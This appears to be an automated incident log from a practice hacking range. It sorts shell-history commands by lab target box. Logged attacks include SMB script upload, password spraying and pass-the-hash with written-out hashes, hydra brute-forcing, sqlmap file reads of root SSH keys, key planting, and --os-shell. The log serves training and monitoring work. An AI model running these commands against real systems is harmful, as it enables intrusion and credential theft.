## Incident 734 - 2026-01-26T19:22:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:22:09 | logs/10.100.7.13/shell_history.csv#L111 | sudo apt install gccgo-go
  - 2026-01-26T19:22:40 | logs/10.100.7.24/shell_history.csv#L147 | vim maintenance.ps1

## Incident 735 - 2026-01-26T19:25:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:25:28 | logs/10.100.7.24/shell_history.csv#L149 | vim maintenance.ps1
  - 2026-01-26T19:25:40 | logs/10.100.7.24/shell_history.csv#L151 | ls

## Incident 736 - 2026-01-26T19:25:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:25:33 | logs/10.100.7.24/shell_history.csv#L150 | smbclient //10.100.7.46/Scripts -c put maintenance.ps1 maintenance.ps1""
  - 2026-01-26T19:25:53 | logs/10.100.7.24/shell_history.csv#L152 | smbclient //10.100.7.46/Scripts -U “”
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 737 - 2026-01-26T19:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:26:27 | logs/10.100.7.13/shell_history.csv#L115 | sudo install goop
  - 2026-01-26T19:26:29 | logs/10.100.7.13/shell_history.csv#L116 | sudo install goop
  - 2026-01-26T19:26:02 | logs/10.100.7.24/shell_history.csv#L153 | mv maintenance.ps1 maintenance2.ps1
  - 2026-01-26T19:26:16 | logs/10.100.7.24/shell_history.csv#L155 | ls
  - 2026-01-26T19:26:26 | logs/10.100.7.24/shell_history.csv#L156 | vim maintenance.ps1
  - 2026-01-26T19:26:40 | logs/10.100.7.31/shell_history.csv#L15 | clear
  - 2026-01-26T19:26:55 | logs/10.100.7.31/shell_history.csv#L16 | cd /usr/share/wordlists

## Incident 738 - 2026-01-26T19:26:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:26:15 | logs/10.100.7.24/shell_history.csv#L154 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-26T19:26:35 | logs/10.100.7.24/shell_history.csv#L157 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
  - 2026-01-26T19:26:41 | logs/10.100.7.24/shell_history.csv#L158 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4!
  - 2026-01-26T19:26:45 | logs/10.100.7.24/shell_history.csv#L159 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 739 - 2026-01-26T19:33:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:33:06 | logs/10.100.7.24/shell_history.csv#L172 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:33:10 | logs/10.100.7.24/shell_history.csv#L173 | smbclient -L //10.100.7.46 -U “”
  - 2026-01-26T19:33:27 | logs/10.100.7.24/shell_history.csv#L174 | smbclient //10.100.7.46/Scripts -U “”
  - 2026-01-26T19:33:59 | logs/10.100.7.31/shell_history.csv#L18 | nxc smb 10.100.7.46 -u ember -p passwrod
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 740 - 2026-01-26T19:35:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:35:08 | logs/10.100.7.24/shell_history.csv#L179 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4D! --local-auth
  - 2026-01-26T19:35:08 | logs/10.100.7.24/shell_history.csv#L180 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:35:14 | logs/10.100.7.24/shell_history.csv#L181 | nxc smb 10.100.7.46 -u rand -p dFMVxYA4!
  - 2026-01-26T19:35:32 | logs/10.100.7.24/shell_history.csv#L182 | xfreerdp3 /u:rand /v:10.100.7.46 /p:dFMVxYA4
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 741 - 2026-01-26T19:36:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:36:29 | logs/10.100.7.13/shell_history.csv#L133 | ls -la
  - 2026-01-26T19:36:56 | logs/10.100.7.13/shell_history.csv#L134 | cd forge-logs.git
  - 2026-01-26T19:36:58 | logs/10.100.7.24/shell_history.csv#L184 | vim maintenance.ps1

## Incident 742 - 2026-01-26T19:41:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:41:03 | logs/10.100.7.13/shell_history.csv#L159 | cat exclude
  - 2026-01-26T19:41:05 | logs/10.100.7.13/shell_history.csv#L160 | cat exclude
  - 2026-01-26T19:41:16 | logs/10.100.7.13/shell_history.csv#L161 | git ls-files --others --exclude-from=.git/info/exclude
  - 2026-01-26T19:41:33 | logs/10.100.7.13/shell_history.csv#L162 | cat objects
  - 2026-01-26T19:41:35 | logs/10.100.7.13/shell_history.csv#L163 | cd objects
  - 2026-01-26T19:41:06 | logs/10.100.7.31/shell_history.csv#L22 | clear

## Incident 743 - 2026-01-26T19:41:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-26T19:41:04 | logs/10.100.7.31/shell_history.csv#L21 | enum4linux -a 10.100.7.45
  - 2026-01-26T19:41:29 | logs/10.100.7.31/shell_history.csv#L23 | enum4linux -a 10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 744 - 2026-01-26T19:42:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:42:00 | logs/10.100.7.13/shell_history.csv#L164 | cd ~/git_info/forge-logs.git
  - 2026-01-26T19:42:03 | logs/10.100.7.13/shell_history.csv#L165 | ls
  - 2026-01-26T19:42:06 | logs/10.100.7.13/shell_history.csv#L166 | cd objects
  - 2026-01-26T19:42:08 | logs/10.100.7.13/shell_history.csv#L167 | ls
  - 2026-01-26T19:42:18 | logs/10.100.7.13/shell_history.csv#L168 | cd info
  - 2026-01-26T19:42:20 | logs/10.100.7.13/shell_history.csv#L169 | ls
  - 2026-01-26T19:42:28 | logs/10.100.7.13/shell_history.csv#L170 | cd .
  - 2026-01-26T19:42:47 | logs/10.100.7.13/shell_history.csv#L171 | cd -
  - 2026-01-26T19:42:52 | logs/10.100.7.13/shell_history.csv#L172 | cd -
  - 2026-01-26T19:42:33 | logs/10.100.7.31/shell_history.csv#L27 | clear

## Incident 745 - 2026-01-26T19:42:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-26T19:42:10 | logs/10.100.7.24/shell_history.csv#L192 | smbclient //10.100.7.42/public -U “”
  - 2026-01-26T19:42:34 | logs/10.100.7.24/shell_history.csv#L194 | smbclient //10.100.7.42/ADMIN -U “”
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 746 - 2026-01-26T19:42:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-26T19:42:39 | logs/10.100.7.24/shell_history.csv#L195 | xfreerdp3 /u:rand2 /v:10.100.7.46 /p:dFMVxYA4
  - 2026-01-26T19:42:01 | logs/10.100.7.31/shell_history.csv#L25 | enum4linux -a -u ember -p password 10.100.7.46
  - 2026-01-26T19:42:20 | logs/10.100.7.31/shell_history.csv#L26 | enum4linux -a -u Adminsitrator -p password 10.100.7.46
  - 2026-01-26T19:42:37 | logs/10.100.7.31/shell_history.csv#L28 | enum4linux -a -u Adminsitrator -p password 10.100.7.46
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 747 - 2026-01-26T19:46:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:46:01 | logs/10.100.7.13/shell_history.csv#L181 | ls
  - 2026-01-26T19:46:09 | logs/10.100.7.13/shell_history.csv#L182 | cd info
  - 2026-01-26T19:46:11 | logs/10.100.7.13/shell_history.csv#L183 | ls
  - 2026-01-26T19:46:15 | logs/10.100.7.13/shell_history.csv#L184 | cat exclude
  - 2026-01-26T19:46:22 | logs/10.100.7.13/shell_history.csv#L185 | cat exclude
  - 2026-01-26T19:46:50 | logs/10.100.7.13/shell_history.csv#L186 | git ls-files --others --exclude-from=.git/info/exclude

## Incident 748 - 2026-01-26T19:54:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-26T19:54:02 | logs/10.100.7.13/shell_history.csv#L198 | ls
  - 2026-01-26T19:54:08 | logs/10.100.7.13/shell_history.csv#L199 | cd forge-logs
  - 2026-01-26T19:54:21 | logs/10.100.7.13/shell_history.csv#L200 | git checkout 7eb86abd35407250c6468b51c0537dc528f2dc1d

## Incident 749 - 2026-01-27T20:07:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-27T20:07:11 | logs/10.100.7.13/shell_history.csv#L238 | smbclient.py orbital:''@10.100.7.42
  - 2026-01-27T20:07:46 | logs/10.100.7.13/shell_history.csv#L239 | smbclient.py //orbital/public:''@10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 750 - 2026-01-27T20:10:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-27T20:10:30 | logs/10.100.7.13/shell_history.csv#L241 | smbclient.py //orbital/public:''@10.100.7.42
  - 2026-01-27T20:10:42 | logs/10.100.7.13/shell_history.csv#L242 | smbclient.py orbital:''@10.100.7.42
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 751 - 2026-01-27T20:28:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:28:08 | logs/10.100.7.13/shell_history.csv#L247 | ftp pyre 10.100.7.45
  - 2026-01-27T20:28:35 | logs/10.100.7.13/shell_history.csv#L249 | ftp guest 10.100.7.45
  - 2026-01-27T20:28:44 | logs/10.100.7.13/shell_history.csv#L250 | ftp anonymous 10.100.7.45
  - 2026-01-27T20:28:50 | logs/10.100.7.12/shell_history.csv#L66 | sqlmap -u 10.100.7.45/panels.php?id=1" -D information_schema --tables"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 752 - 2026-01-27T20:28:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T20:28:23 | logs/10.100.7.13/shell_history.csv#L248 | ftp ember 10.100.7.46
  - 2026-01-27T20:28:26 | logs/10.100.7.24/shell_history.csv#L298 | nxc smb 10.100.7.46 -u Administrator -p 781a57928a384400acf7976192ea685a
  - 2026-01-27T20:28:37 | logs/10.100.7.24/shell_history.csv#L299 | nxc smb 10.100.7.46 -u Administrator -H 781a57928a384400acf7976192ea685a
  - 2026-01-27T20:28:58 | logs/10.100.7.24/shell_history.csv#L300 | nxc smb 10.100.7.46 -u Administrator -H 781a57928a384400acf7976192ea685a
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 753 - 2026-01-27T20:29:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:29:02 | logs/10.100.7.13/shell_history.csv#L251 | ftp pure@10.100.7.45
  - 2026-01-27T20:29:13 | logs/10.100.7.13/shell_history.csv#L252 | ftp anonymous@10.100.7.45
  - 2026-01-27T20:29:23 | logs/10.100.7.13/shell_history.csv#L253 | ftp guest@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 754 - 2026-01-27T20:29:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T20:29:21 | logs/10.100.7.24/shell_history.csv#L301 | nxc smb 10.100.7.46 -u ember -H 745d341a98397b201d8aa95536bdc89f~
  - 2026-01-27T20:29:25 | logs/10.100.7.24/shell_history.csv#L302 | nxc smb 10.100.7.46 -u ember -H 745d341a98397b201d8aa95536bdc89f
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 755 - 2026-01-27T20:30:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:30:06 | logs/10.100.7.13/shell_history.csv#L254 | nmap 10.100.7.45 ip 21
  - 2026-01-27T20:30:06 | logs/10.100.7.13/shell_history.csv#L255 | nmap 10.100.7.45 ip 21
  - 2026-01-27T20:30:17 | logs/10.100.7.13/shell_history.csv#L256 | nmap 10.100.7.45 -p 21
  - 2026-01-27T20:30:10 | logs/10.100.7.12/shell_history.csv#L67 | sqlmap -u 10.100.7.45/panels.php?id=1" -D information_schema -T ADMINISTRABLE_ROLE_AUTHORIZATIONS --columns"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 756 - 2026-02-02T18:40:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:40:34 | logs/10.100.7.13/shell_history.csv#L261 | ss -antlp
  - 2026-02-02T18:40:03 | logs/10.100.7.12/shell_history.csv#L141 | history
  - 2026-02-02T18:40:05 | logs/10.100.7.12/shell_history.csv#L142 | history

## Incident 757 - 2026-02-02T18:40:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:40:01 | logs/10.100.7.12/shell_history.csv#L140 | sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch --tables"
  - 2026-02-02T18:40:07 | logs/10.100.7.12/shell_history.csv#L143 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T18:40:17 | logs/10.100.7.12/shell_history.csv#L144 | sqlmap -u 10.100.7.45/panels.php?id=1" -D information_schema --tables"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 758 - 2026-02-02T18:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:43:00 | logs/10.100.7.13/shell_history.csv#L262 | cd /var/log
  - 2026-02-02T18:43:20 | logs/10.100.7.13/shell_history.csv#L263 | cd auth.log
  - 2026-02-02T18:43:23 | logs/10.100.7.13/shell_history.csv#L264 | cd ..
  - 2026-02-02T18:43:28 | logs/10.100.7.13/shell_history.csv#L265 | cd ~

## Incident 759 - 2026-02-02T18:43:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:43:09 | logs/10.100.7.12/shell_history.csv#L147 | sqlmap -u 10.100.7.45/panels.php?id=1" -D performance_schema --tables"
  - 2026-02-02T18:43:34 | logs/10.100.7.12/shell_history.csv#L148 | sqlmap -u 10.100.7.45/panels.php?id=1" -D information_schema -T ADMINISTRABLE_ROLE_AUTHORIZATIONS --columns"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 760 - 2026-02-02T18:52:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:52:53 | logs/10.100.7.13/shell_history.csv#L274 | hydra -L user.txt -P /user/share/wordlist/rockyou.txt ftp://10.100.7.45
  - 2026-02-02T18:52:21 | logs/10.100.7.12/shell_history.csv#L151 | sqlmap -u 10.100.7.45/panels.php?id=1" -D information_schema --dump"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 761 - 2026-02-02T18:56:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:56:53 | logs/10.100.7.13/shell_history.csv#L275 | ssh pyre@10.100.7.45
  - 2026-02-02T18:56:57 | logs/10.100.7.12/shell_history.csv#L158 | sqlmap -u 10.100.7.45/panels.php?id=1" --tables -D master"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 762 - 2026-02-02T18:58:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:58:24 | logs/10.100.7.13/shell_history.csv#L276 | ssh pyre@10.100.7.45
  - 2026-02-02T18:58:24 | logs/10.100.7.13/shell_history.csv#L277 | ssh pyre@10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 763 - 2026-02-02T19:25:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:25:01 | logs/10.100.7.13/shell_history.csv#L294 | gobuster dir -u http://10.100.7.45 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
  - 2026-02-02T19:25:44 | logs/10.100.7.12/shell_history.csv#L163 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 764 - 2026-02-02T19:27:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:27:52 | logs/10.100.7.13/shell_history.csv#L295 | ?id=1'
password

exit




exit
exit
'
  - 2026-02-02T19:27:50 | logs/10.100.7.12/shell_history.csv#L165 | clear

## Incident 765 - 2026-02-02T19:44:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:44:08 | logs/10.100.7.13/shell_history.csv#L305 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%201--%20-""
  - 2026-02-02T19:44:45 | logs/10.100.7.13/shell_history.csv#L306 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%202--%20-""
  - 2026-02-02T19:44:56 | logs/10.100.7.13/shell_history.csv#L307 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%203--%20-""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 766 - 2026-02-02T19:45:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:45:08 | logs/10.100.7.13/shell_history.csv#L308 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%204--%20-""
  - 2026-02-02T19:45:19 | logs/10.100.7.13/shell_history.csv#L309 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%205--%20-""
  - 2026-02-02T19:45:34 | logs/10.100.7.13/shell_history.csv#L310 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%206--%20-""
  - 2026-02-02T19:45:43 | logs/10.100.7.13/shell_history.csv#L311 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%207--%20-""
  - 2026-02-02T19:45:55 | logs/10.100.7.13/shell_history.csv#L312 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%210--%20-""
  - 2026-02-02T19:45:32 | logs/10.100.7.12/shell_history.csv#L179 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=Documents/id_rsa --file-dest=/root/.ssh/id_rsa"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 767 - 2026-02-02T19:49:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:49:06 | logs/10.100.7.13/shell_history.csv#L323 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2060--%20-""
  - 2026-02-02T19:49:20 | logs/10.100.7.13/shell_history.csv#L324 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2080--%20-""
  - 2026-02-02T19:49:32 | logs/10.100.7.13/shell_history.csv#L325 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%20210--%20-""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 768 - 2026-02-02T19:49:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:49:04 | logs/10.100.7.12/shell_history.csv#L189 | cat /Documents/rsa_id
  - 2026-02-02T19:49:06 | logs/10.100.7.12/shell_history.csv#L190 | cd Documents
  - 2026-02-02T19:49:08 | logs/10.100.7.12/shell_history.csv#L191 | ls
  - 2026-02-02T19:49:10 | logs/10.100.7.12/shell_history.csv#L192 | cat id_rsa
  - 2026-02-02T19:49:18 | logs/10.100.7.12/shell_history.csv#L193 | cd ~
  - 2026-02-02T19:49:22 | logs/10.100.7.12/shell_history.csv#L194 | cat /Documents/rsa_id
  - 2026-02-02T19:49:28 | logs/10.100.7.12/shell_history.csv#L195 | cat Documents/rsa_id
  - 2026-02-02T19:49:35 | logs/10.100.7.12/shell_history.csv#L196 | cat Documents/rsa_id
  - 2026-02-02T19:49:49 | logs/10.100.7.12/shell_history.csv#L197 | cat Documents/rsa_id
  - 2026-02-02T19:49:55 | logs/10.100.7.12/shell_history.csv#L198 | cat ./Documents/rsa_id

## Incident 769 - 2026-02-02T19:51:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:51:12 | logs/10.100.7.13/shell_history.csv#L326 | curl http://10.100.7.45/panels.php?id=5%20AND%201=1""
  - 2026-02-02T19:51:03 | logs/10.100.7.12/shell_history.csv#L202 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=./id_rsa --file-dest=/root/.ssh/id_rsa"
  - 2026-02-02T19:51:29 | logs/10.100.7.12/shell_history.csv#L203 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa"
  - 2026-02-02T19:51:52 | logs/10.100.7.12/shell_history.csv#L204 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=id_rsa --file-dest=/root/.ssh/id_rsa"
  - 2026-02-02T19:51:56 | logs/10.100.7.12/shell_history.csv#L205 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 770 - 2026-02-02T20:02:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T20:02:00 | logs/10.100.7.13/shell_history.csv#L332 | 1))>10""
  - 2026-02-02T20:02:08 | logs/10.100.7.13/shell_history.csv#L333 | 1))>5""
  - 2026-02-02T20:02:15 | logs/10.100.7.13/shell_history.csv#L334 | 1))>3""
  - 2026-02-02T20:02:20 | logs/10.100.7.13/shell_history.csv#L335 | 1))>2""
  - 2026-02-02T20:02:26 | logs/10.100.7.13/shell_history.csv#L336 | 1))>1""
  - 2026-02-02T20:02:48 | logs/10.100.7.13/shell_history.csv#L337 | 1))>0""

## Incident 771 - 2026-02-02T20:02:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T20:02:32 | logs/10.100.7.12/shell_history.csv#L213 | sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"
  - 2026-02-02T20:02:48 | logs/10.100.7.12/shell_history.csv#L214 | sqlmap -u 10.100.7.45/panels.php?id=1" --privileges"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 772 - 2026-01-08T19:03:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-08T19:03:03 | logs/10.100.7.22/shell_history.csv#L5 | exit
  - 2026-01-08T19:03:13 | logs/10.100.7.22/shell_history.csv#L6 | exit
  - 2026-01-08T19:03:13 | logs/10.100.7.22/shell_history.csv#L7 | exit
  - 2026-01-08T19:03:19 | logs/10.100.7.22/shell_history.csv#L8 | exit

## Incident 773 - 2026-01-12T19:17:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:17:16 | logs/10.100.7.22/shell_history.csv#L16 | unzip backup.zip
  - 2026-01-12T19:17:20 | logs/10.100.7.22/shell_history.csv#L17 | ls
  - 2026-01-12T19:17:41 | logs/10.100.7.22/shell_history.csv#L18 | vim credentials.txt

## Incident 774 - 2026-01-12T19:21:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-12T19:21:49 | logs/10.100.7.22/shell_history.csv#L23 | ssh solaris@10.100.7.40
  - 2026-01-12T19:21:49 | logs/10.100.7.22/shell_history.csv#L24 | ssh solaris@10.100.7.40
  - 2026-01-12T19:21:57 | logs/10.100.7.22/shell_history.csv#L25 | smbclient -L //10.100.7.40 -U "

## Incident 775 - 2026-01-12T19:23:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:23:19 | logs/10.100.7.22/shell_history.csv#L28 | smbclient //10.100.7.42/public -U "
  - 2026-01-12T19:23:27 | logs/10.100.7.22/shell_history.csv#L29 | smbclient //10.100.7.42/ADMIN -U "
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 776 - 2026-01-12T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-12T19:23:36 | logs/10.100.7.22/shell_history.csv#L30 | cat readme.txt
  - 2026-01-12T19:23:47 | logs/10.100.7.22/shell_history.csv#L31 | cat hashes.txt

## Incident 777 - 2026-01-12T19:31:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-12T19:31:17 | logs/10.100.7.22/shell_history.csv#L33 | xfreerdp3 /u:orbital /v:10.100.7.42 /p:securepassword
  - 2026-01-12T19:31:34 | logs/10.100.7.22/shell_history.csv#L34 | xfreerdp3 /u:Administrator /v:10.100.7.42 /p:securepassword
  - 2026-01-12T19:31:45 | logs/10.100.7.22/shell_history.csv#L35 | xfreerdp3 /u:Administrator /v:10.100.7.42 /p:qwerty
  - 2026-01-12T19:31:52 | logs/10.100.7.22/shell_history.csv#L36 | xfreerdp3 /u:Administrator /v:10.100.7.42 /p:abc123
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 778 - 2026-01-13T20:32:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-13T20:32:12 | logs/10.100.7.22/shell_history.csv#L80 | ls
  - 2026-01-13T20:32:31 | logs/10.100.7.22/shell_history.csv#L81 | vim thinclient_drives

## Incident 779 - 2026-01-20T19:13:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:13:26 | logs/10.100.7.22/shell_history.csv#L98 | cd .shh
  - 2026-01-20T19:13:29 | logs/10.100.7.22/shell_history.csv#L99 | cd .ssh
  - 2026-01-20T19:13:30 | logs/10.100.7.22/shell_history.csv#L100 | ls
  - 2026-01-20T19:13:41 | logs/10.100.7.22/shell_history.csv#L101 | ssh-add authorized_keys

## Incident 780 - 2026-01-20T19:24:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-20T19:24:08 | logs/10.100.7.22/shell_history.csv#L111 | ssh -i authorized_keys kali@10.100.7.40
  - 2026-01-20T19:24:24 | logs/10.100.7.22/shell_history.csv#L112 | nmap -sV -p 22 -T3 10.100.7.40

## Incident 781 - 2026-01-20T19:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-20T19:37:04 | logs/10.100.7.22/shell_history.csv#L127 | eval $(ssh-agent -s)
  - 2026-01-20T19:37:42 | logs/10.100.7.22/shell_history.csv#L129 | ls

## Incident 782 - 2026-01-20T19:43:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-20T19:43:39 | logs/10.100.7.22/shell_history.csv#L141 | ./exp 10.100.7.40 22
  - 2026-01-20T19:43:44 | logs/10.100.7.22/shell_history.csv#L142 | ./exp 10.100.7.40 22
  - 2026-01-20T19:43:45 | logs/10.100.7.22/shell_history.csv#L143 | ./exp 10.100.7.40 22
  - 2026-01-20T19:43:46 | logs/10.100.7.22/shell_history.csv#L144 | ./exp 10.100.7.40 22

## Incident 783 - 2026-01-20T19:50:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
